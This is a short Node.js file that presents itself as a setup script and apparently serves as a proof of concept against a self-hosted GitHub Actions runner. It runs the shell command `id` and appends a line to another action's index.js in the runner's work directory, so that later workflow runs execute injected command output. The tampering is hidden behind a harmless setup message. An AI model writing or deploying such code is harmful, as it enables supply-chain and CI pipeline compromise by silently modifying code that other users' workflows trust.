const cl_process = require("child_process");

console.log("this is a setup.....")

cl_process.exec('echo `id`', (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});

cl_process.exec('echo \'core.setOutput("time", "\`id\`");\' >> /home/musset/actions-runner/_work/_actions/dreamli0/my-action/main/index.js', (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});

